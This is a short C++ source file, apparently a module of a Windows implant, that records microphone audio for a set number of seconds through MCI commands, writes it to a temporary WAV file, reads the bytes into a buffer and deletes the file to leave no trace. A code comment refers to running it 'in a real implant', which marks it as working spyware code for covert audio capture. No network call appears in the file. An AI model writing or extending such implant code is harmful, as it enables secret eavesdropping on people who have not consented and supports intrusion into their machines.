#include "Audio.h"
#include <string>
#include <fstream>
#include <thread>
#include <mmsystem.h>

#pragma comment(lib, "winmm.lib")

namespace capture {

    std::vector<BYTE> RecordAudio(int seconds) {
        // Use a random alias to avoid conflicts if called rapidly
        // In a real implant, generate random string. Here, fixed is okay for serialized tasks.
        std::string alias = "mysound";
        
        // Open
        mciSendStringA(("open new type waveaudio alias " + alias).c_str(), NULL, 0, NULL);
        
        // Record
        mciSendStringA(("record " + alias).c_str(), NULL, 0, NULL);
        
        // Wait
        std::this_thread::sleep_for(std::chrono::seconds(seconds));
        
        // Stop
        mciSendStringA(("stop " + alias).c_str(), NULL, 0, NULL);
        
        // Save to temp file
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        std::string wavPath = std::string(tempPath) + "rec.wav";
        
        mciSendStringA(("save " + alias + " \"" + wavPath + "\"").c_str(), NULL, 0, NULL);
        mciSendStringA(("close " + alias).c_str(), NULL, 0, NULL);
        
        // Read file
        std::vector<BYTE> buffer;
        std::ifstream file(wavPath, std::ios::binary | std::ios::ate);
        if (file.is_open()) {
            std::streampos size = file.tellg();
            buffer.resize((size_t)size);
            file.seekg(0, std::ios::beg);
            file.read((char*)buffer.data(), size);
            file.close();
            DeleteFileA(wavPath.c_str());
        }
        
        return buffer;
    }

}
